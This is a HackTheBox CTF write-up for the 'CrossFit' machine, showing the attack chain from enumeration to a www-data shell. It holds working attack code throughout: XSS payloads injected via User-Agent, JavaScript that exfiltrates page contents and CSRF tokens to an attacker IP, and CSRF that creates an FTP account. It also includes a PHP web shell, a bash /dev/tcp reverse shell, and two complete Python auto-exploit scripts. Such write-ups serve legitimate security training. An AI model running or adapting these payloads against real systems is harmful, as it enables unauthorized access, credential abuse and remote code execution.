---
title: "HackTheBox - CrossFit"
categories: [HackTheBox, Insane]
tags: [Linux,Insane,Web,OSWE,XSS]
mermaid: true
image: https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2009:56:42.png
---

CrossFit was an extremelly useful box to learn and train my XSS skills. It starts with a XSS on a message param. Then you do a CSRF, by creating an account on a ftp server with the admin credentials.

You upload a webshell on the ftp server, then execute it with js.

The auto rev shell from the user www-data is on the body.

# Diagram

Here is the diagram for this machine. It's a resume from it.

I'll do it when I finish it in the future.

# Enumeration

First step is to enumerate the box. For this we'll use `nmap`

```sh
nmap -sV -sC -Pn 10.10.10.208
```

> -sV - Services running on the ports

> -sC - Run some standart scripts

> -Pn - Consider the host alive

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2009:58:55.png)

## Port 21

It's FTP, and we have a ssl cert in it, so let's read it

[This](https://community.boomi.com/s/article/retrievingftptlssslservercertificate) way

```sh
openssl s_client -connect 10.10.10.208:21 -starttls ftp
```

And we found another vhost

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2010:06:14.png)

## Port 80

We try to open it on the browser

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2009:58:30.png)

Just the standart apache page

We add crossfit.htb and gym-club.crossfit.htb to our /etc/hosts file

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2010:04:17.png)

Still the same page in crossfit.htb

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2009:59:52.png)

In gym-club.crossfit.htb we found a page

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2010:05:15.png)

We start enumerating the web page, and found a form in `contact.php`

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2010:08:41.png)

Tryed to put some standard xss, but nothing worked well.

### Gobuster

We decided to run a gobuster in this box, to see if we can get more folders, I'll use the flag -x php, because I know this web app is php

```sh
gobuster dir -u http://gym-club.crossfit.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 20
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2010:14:05.png)

Many of them we've already enumerated, so, there is no need to carry on them. The only I need to open here, is the `security_thread`

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2010:35:18.png)

We try to open the `report.php` and get a privilege error.

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2010:35:46.png)

Interesting, we need to execute it as admin to read the file!

### Blog-Single

After looking for another place to input data, we found a new one in `http://gym-club.crossfit.htb/blog-single.php`

It's a comment part

We just try to send a comment

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2010:19:54.png)

The comment was sent and a message appears on my screen

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2010:20:24.png)

We also send it to burp, to play arround

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2010:21:09.png)

### XSS Attempt

Let's try some XSS in it. This "will be evaluated by a moderator" is a strong indicative that it's vulnerable to XSS

First, I tried the simple one

`<script src="http://10.10.14.20"></script>`

And got a message error... Interesting

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2010:24:11.png)

```
A security report containing your IP address and browser information will be generated and our admin team will be immediately notified
```

Interesting, information about my ip address and browser. I spent a lot of time trying to byppass it, but this message give me a good clue about what to do.

What if we send the XSS in our browser information, as User-Agent for example?

We send it, the error was triggered

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2010:34:34.png)

And we get it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2010:34:49.png)

Good, what if we make the admin read the report.php file for us?

First let's get the page

0x4rt3mis.js

```js
function send_report(){
        var req=new XMLHttpRequest();
        req.open('GET', 'http://10.10.14.20:9090/?xss=' + document.body.innerHTML, true);
        req.send();
}

send_report();
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2010:51:25.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2010:52:34.png)

Ok, we know that it's getting back, now, we should get the report.php file, make the admin read that and send me the content of it

```js
function read_report(){
        var req=new XMLHttpRequest();
        var url = "http://gym-club.crossfit.htb/security_threat/report.php";
        req.open("GET", url, true);
        req.send();
        req.onreadystatechange = function(){
        if(req.readyState == XMLHttpRequest.DONE){
                var resultText = btoa(req.response);
                send(resultText)
                }
        }
}

function send(resultText){
        var xhr=new XMLHttpRequest();
        xhr.open('GET', 'http://10.10.14.20:9090/?xss=' + resultText, true);
        xhr.send();
}

read_report();
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2002:00:56.png)

Decode it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2002:01:11.png)

Nothing very useful

Sure! How I'm a guy that like the things scripted and automated... Let's automate the "file reader" now!

### Auto XSS

We will use our python skeleton to do that

```py
#!/usr/bin/python3

import argparse
import requests
import sys

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    args = parser.parse_args()
    
    '''Here we call the functions'''
    
if __name__ == '__main__':
    main()
```

Here it is

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2007:37:06.png)

Obvislouly it's not a LFI or anything like that. But was good for practice and maybe in the future we use that to "access" the page as admin.

auto_xss.py

```py
#!/usr/bin/python3
# Author: 0x4rt3mis
# Auto XSS and Session Riding - CrossFit - HackTheBox

import argparse
import requests
import sys
import base64
from threading import Thread
import threading
import http.server
import socket
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
import re

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
# Setting the python web server
def webServer():
    debug = True
    server = http.server.ThreadingHTTPServer(('0.0.0.0', 80), SimpleHTTPRequestHandler)
    if debug:
        print("[+] Starting Web Server in background [+]")
        thread = threading.Thread(target = server.serve_forever)
        thread.daemon = True
        thread.start()
    else:
        print("Starting Server")
        print('Starting server at http://{}:{}'.format('0.0.0.0', 80))
        server.serve_forever()

# Trigger the XSS
def triggerXSS(lhost):
    url = "http://gym-club.crossfit.htb:80/blog-single.php"
    headers = {"User-Agent": "<script src=\"http://%s/0x4rt3mis.js\"></script>" %lhost, "Content-Type": "application/x-www-form-urlencoded"}
    data = {"name": "0x4rt3mis", "email": "0x4rt3mis@email.com", "phone": "123456", "message": "<script src=\"http://10.10.10.10/\"></script>", "submit": "submit"}
    r.post(url, headers=headers, data=data, proxies=proxies)

# Base64 decode things
def b64d(s):
    return base64.b64decode(s).decode()

# Create the JS payload to be sent
def createPayload(file,lhost):
    payload = "function read_report(){\n"
    payload += "        var req=new XMLHttpRequest();\n"
    payload += "        var url = 'http://gym-club.crossfit.htb/%s';\n" %file
    payload += "        req.open('GET', url, true);\n"
    payload += "        req.send();\n"
    payload += "        req.onreadystatechange = function(){\n"
    payload += "        if(req.readyState == XMLHttpRequest.DONE){\n"
    payload += "                var resultText = btoa(req.response);\n"
    payload += "                send(resultText)\n"
    payload += "                }\n"
    payload += "        }\n"
    payload += "}\n"
    payload += "function send(resultText){\n"
    payload += "        var xhr=new XMLHttpRequest();\n"
    payload += "        xhr.open('GET', 'http://%s:9999/' + resultText, true);\n" %lhost
    payload += "        xhr.send();\n"
    payload += "}\n"
    payload += "read_report();\n"
    f = open("0x4rt3mis.js", "w")
    f.write(payload)
    f.close()

# Function to just read the get.txt file and convert it
def readFile():
    f = open('get.txt','r')
    output= f.read()
    if len(output) < 5:
        print("[+] File does not exist or I can't read it!! ")
    else:
        b64encoded = re.search(' .* ', output).group(0)
        b64encoded = b64encoded.removeprefix(" /")
        print()
        print(b64d(b64encoded))

# Function to iterate trough files
def xssLFI(lhost,rhost):
    prefix = "Reading file: "
    file = ""
    while True:
        file = input(prefix)
        if file != "exit":
            createPayload(file,lhost)
            triggerXSS(lhost)
            os.system('nc -q 5 -lnvp 9999 > get.txt 2>/dev/null &')
            os.system("sleep 5")
            readFile()
        else:
            print("[+] Exitttttting..... !!!! [+]")
            break

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--localip', help='Local ip address or hostname', required=True)
    args = parser.parse_args()

    rhost = args.target
    lhost = args.localip

    '''Here we call the functions'''
    # Set up the web python server
    webServer()
    # Trigger it
    xssLFI(lhost,rhost)

if __name__ == '__main__':
    main()
```

We can get other files as admin, but nothing useful returned. 

### Vhost Fuzzing (AGAIN)

We did as the same 0xdf in his blog, which is very well explained what is happening here by him

```
At this point I got a hint to try to use the Origin header to enumerate subdomains, which is explained here. The Origin headers is a part of a mechanism called cross-origin resource sharing (CORS) that allows a page to page in domain A to make resources accessible to domain B without making them accessible to the larger world. Browsers will allow embedding of things like images, stylesheets, scripts, etc, but specifically block things like AJAX requests in JavaScript with same-origin policy. The idea is that a server can specify what domains, other than its own, the browser should allow loading of resources. If the server includes the Origin: header, then the receiving server will respond with a Access-Control-Allow-Origin: header to let the server know it is ok to access these assets.

The idea here is that if Crossfit explicitly allows another domain, it must exist (and likely explicitly allows requests from gym-club).
```

```sh
wfuzz -u http://gym-club.crossfit.htb/ -H "Origin: http://FUZZ.crossfit.htb" --filter "r.headers.response ~ 'Access-Control-Allow-Origin'" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
```

The `--filter "r.headers.response ~ 'Access-Control-Allow-Origin'"` will filter for any response with that header. 

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2007:53:29.png)

Ok, we found the `ftp` subdomain

## FTP CORS

Once we got it, let's try to access it on the browser

After add in `/etc/hosts` we access it's page on the browser

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2007:54:34.png)

For our box, possibly it comes the apache default page, but how about we come from the `gym-club`? We can do that with the XSS we discover earlier

We do a small change on my exploit

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2007:57:15.png)

And try to read ftp.crossfit.htb

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2007:57:47.png)

Yes, the page is different. We save the content to html and open in the browser

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2007:58:43.png)

That's the page we want! Now we can see that it refers to /accounts/create, let's take a look in it also

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2008:00:02.png)

Save it to html, and read again

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2008:00:58.png)

Great! Seems that we can create an account on the website.

# CSRF Account Request

We see on the html it let us send username and pass to it. This is now moving from XSS to Cross-Site Request Forgery (CSRF / XSRF), in the case of this box, I want the admin make an action for me, create a new user.

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2008:15:32.png)

The "problem" is the _token variable, I need to get it and reuse it. Here is the way I got it, parsing the response and sending it to me, to check if it's okay.

0x4rt3mis.js

```js
// This section is to get the body response in a variable, as response
var url = 'http://ftp.crossfit.htb/accounts/create';
var body = new XMLHttpRequest();
body.open('GET', url, false);
body.send();
var response = body.responseText;

// This section is to just parse it and get the token value
var parser = new DOMParser();
var response_text = parser.parseFromString(response, "text/html");
var token = response_text.getElementsByName("_token")[0].value;

// This section is to send the token value to us
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://10.10.14.20:9999/' + token, true);
xhr.send();
```

And here we got it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2009:16:02.png)

Now, we need to create an account in it. We send as POST request the params.

```js
// Function created to simplify the debbug, always send as param the value you want to debbug
function debug(debug){
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://10.10.14.20:9999/' + debug, true);
        xhr.send();
}

// Function to parse the response and get the token from it
function getToken(response){
        var parser = new DOMParser();
        var response_text = parser.parseFromString(response, "text/html");
        return response_text.getElementsByName("_token")[0].value;
}

// Function to make the things happen
function createAccount(){
        // Get the Token
        var req_token = new XMLHttpRequest();
        // Request both from get token and create user must be in the same session
        req_token.onreadystatechange = function(){
                if (req_token.readyState == XMLHttpRequest.DONE) {
                        var token = getToken(req_token.responseText);
                        debug(token);
                        // Create the account in the same "session"
                        var req_create = new XMLHttpRequest();
                        var url_create = 'http://ftp.crossfit.htb/accounts';
                        req_create.open("POST", url_create, false);
                        req_create.withCredentials = true;
                        req_create.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                        var values = "username=0x4rt3mis&pass=0x4rt3mis0x4rt3mis&_token=" + token;
                        req_create.send(values);
                        debug(btoa(req_create.response));
                }
        }
        // After parse everything, just trigger it
        var url = 'http://ftp.crossfit.htb/accounts/create';
        req_token.open('GET', url, false);
        req_token.withCredentials = true;
        req_token.send();
}

// Trriger the account creation
createAccount()
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2008:13:49.png)

We open the html response in the browser. And it's really created!

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2008:16:10.png)

And now, we log on the ftp

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2008:18:56.png)

# Reverse Shell

Seems that we are on the webroot of the ftp. We cannot reach it from the browser, but we can do that from the XSS we got earlier.

We upload a simple cmd php.

```php
<?php system($_REQUEST['cmd']); ?>
```

The folder we upload is the development-test.crossfit.htb, because we have read and write acces to it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2008:23:33.png)

Ok, done, now just make a new XMLHTTPrequest to it, to trigger it

I did a rce.js just to test a cmd exec

```js
// Function created to simplify the debbug, always send as param the value you want to debbug
function debug(debug){
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://10.10.14.20:9999/' + debug, true);
        xhr.send();
}

// Function just to try cmd id
function getRCE(){
        var rev = new XMLHttpRequest();
        var url = "http://development-test.crossfit.htb/cmd.php?cmd=id";
        rev.open("GET", url, false);
        rev.send();
        debug(rev.response);
}

getRCE()
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2008:49:43.png)

Now, the reverse shell

```js
// Function created to simplify the debbug, always send as param the value you want to debbug
function debug(debug){
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://10.10.14.20:9999/' + debug, true);
        xhr.send();
}

// Function just to get the reverse shell
function getRCE(){
	var rev = new XMLHttpRequest();
	var url = "http://development-test.crossfit.htb/cmd.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.20/443+0>%261'";
	rev.open("GET", url, true);
	rev.send();
}

getRCE()
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2007:30:08.png)

# Auto Reverse Shell

Now, let's automate all the reverse shell!

Here it's

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2008:23:43.png)

rev_auto.py

```py
#!/usr/bin/python3
# Author: 0x4rt3mis
# Auto Exploit for www-data - CrossFit - HackTheBox

import argparse
import requests
import sys
from threading import Thread
import threading
import http.server
import socket
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
import re
import socket, telnetlib
from threading import Thread

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
# Set the handler
def handler(lport,target):
    print("[+] Starting handler on %s [+]" %lport)
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" %target) 
    t.sock = conn
    print("[+] Shell'd [+]")
    t.interact()
    
# Setting the python web server
def webServer():
    debug = True
    server = http.server.ThreadingHTTPServer(('0.0.0.0', 80), SimpleHTTPRequestHandler)
    if debug:
        print("[+] Starting Web Server in background [+]")
        thread = threading.Thread(target = server.serve_forever)
        thread.daemon = True
        thread.start()
    else:
        print("Starting Server")
        print('Starting server at http://{}:{}'.format('0.0.0.0', 80))
        server.serve_forever()

# Trigger the XSS
def triggerXSS(lhost):
    url = "http://gym-club.crossfit.htb:80/blog-single.php"
    headers = {"User-Agent": "<script src=\"http://%s/0x4rt3mis_auto.js\"></script>" %lhost, "Content-Type": "application/x-www-form-urlencoded"}
    data = {"name": "0x4rt3mis", "email": "0x4rt3mis@email.com", "phone": "123456", "message": "<script src=\"http://10.10.10.10/\"></script>", "submit": "submit"}
    r.post(url, headers=headers, data=data, proxies=proxies)
    
def uploadPHP():
    # Create the cmd.php file
    print("[+] Creating and sending the cmd file !! [+]")
    os.system('echo "<?php system(\$_REQUEST[\'cmd\']); ?>" > cmd.php')
    os.system('sleep 1')
    os.system('lftp -c "open -u 0x4rt3mis,0x4rt3mis0x4rt3mis ftp.crossfit.htb; set ssl:verify-certificate false; put -O development-test/ cmd.php"')
    print("[+] Done, let's get the reverse shell ! [+]")
    
# Function to make the js to do the ftp user
def createPayloadFTP():
    print("[+] Creating the js to create the payload !! [+]")
    payload = "// Function to parse the response and get the token from it\n"
    payload += "function getToken(response){\n"
    payload += "        var parser = new DOMParser();\n"
    payload += "        var response_text = parser.parseFromString(response, 'text/html');\n"
    payload += "        return response_text.getElementsByName('_token')[0].value;\n"
    payload += "}\n"
    payload += "\n"
    payload += "// Function to make the things happen\n"
    payload += "function createAccount(){\n"
    payload += "        // Get the Token\n"
    payload += "        var req_token = new XMLHttpRequest();\n"
    payload += "        // Request both from get token and create user must be in the same session\n"
    payload += "        req_token.onreadystatechange = function(){\n"
    payload += "                if (req_token.readyState == XMLHttpRequest.DONE) {\n"
    payload += "                        var token = getToken(req_token.responseText);\n"
    payload += "                        // Create the account in the same 'session'\n"
    payload += "                        var req_create = new XMLHttpRequest();\n"
    payload += "                        var url_create = 'http://ftp.crossfit.htb/accounts';\n"
    payload += "                        req_create.open('POST', url_create, false);\n"
    payload += "                        req_create.withCredentials = true;\n"
    payload += "                        req_create.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');\n"
    payload += "                        var values = 'username=0x4rt3mis&pass=0x4rt3mis0x4rt3mis&_token=' + token;\n"
    payload += "                        req_create.send(values);\n"
    payload += "                }\n"
    payload += "        }\n"
    payload += "        // After parse everything, just trigger it\n"
    payload += "        var url = 'http://ftp.crossfit.htb/accounts/create';\n"
    payload += "        req_token.open('GET', url, false);\n"
    payload += "        req_token.withCredentials = true;\n"
    payload += "        req_token.send();\n"
    payload += "}\n"
    payload += "\n"
    payload += "\n"
    payload += "// Trriger the account creation\n"
    payload += "createAccount()"
    f = open("0x4rt3mis_auto.js", "w")
    f.write(payload)
    f.close()
    print("[+] JS Created !! [+]")
    
def getReverseShell(lhost,lport):
    payload = "// Function just to try rev shell\n"
    payload += "function getRCE(){\n"
    payload += "	var rev = new XMLHttpRequest();\n"
    payload += "	var url = \"http://development-test.crossfit.htb/cmd.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/" + lhost + "/" + lport + "+0>%261'\";\n"
    payload += "	rev.open('GET', url, true);\n"
    payload += "	rev.send();\n"
    payload += "}\n"
    payload += "getRCE()"
    f = open("0x4rt3mis_auto.js", "w")
    f.write(payload)
    f.close()
    print("[+] JS Reverse Shell Created !! [+]")
    
def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--ipaddress', help='Listening IP address for reverse shell', required=True)
    parser.add_argument('-lp', '--port', help='Listening port for reverse shell', required=True)
    args = parser.parse_args()
    
    rhost = args.target
    lhost = args.ipaddress
    lport = args.port

    '''Here we call the functions'''
    # Set up the handler
    thr = Thread(target=handler,args=(int(lport),rhost))
    thr.start()
    # Set up the web python server
    webServer()
    # Create the payload to create an account on the ftp server
    createPayloadFTP()
    # Trigger to the account the created
    triggerXSS(lhost)
    os.system("sleep 7")
    # Create the payload to get the reverse shell
    getReverseShell(lhost,lport)
    # Upload the malicious php
    uploadPHP()
    # Get the reverse shell
    os.system("sleep 7")
    triggerXSS(lhost)
    os.system("sleep 7")
    # Remove the files
    os.system("rm 0x4rt3mis_auto.js")
    os.system("rm cmd.php")
    
if __name__ == '__main__':
    main()
```

I'll not continue with the privilege escalation. In the future I'll return here and make it again.

# Source Code Analysis

After got the hank password (not shown here), just for debug the source code of it I'll get the source web code

```sh
rsync -azP hank@crossfit.htb:/var/www/* .
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2008:33:37.png)

We start looking the XSS we found earlier

In the file blog-single.php we found this php code

![](/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2001:52:40.png)

It import the functions, it test the message parameter for the request with the XSS filter

In the functions.php we found the both XSS functions

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2001:41:42.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2001:42:19.png)

In report.php we found the place where it delimits the localhost

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-10-27-HackTheBox-CrossFit/2021-10-27-HackTheBox-CrossFit%2001:44:15.png)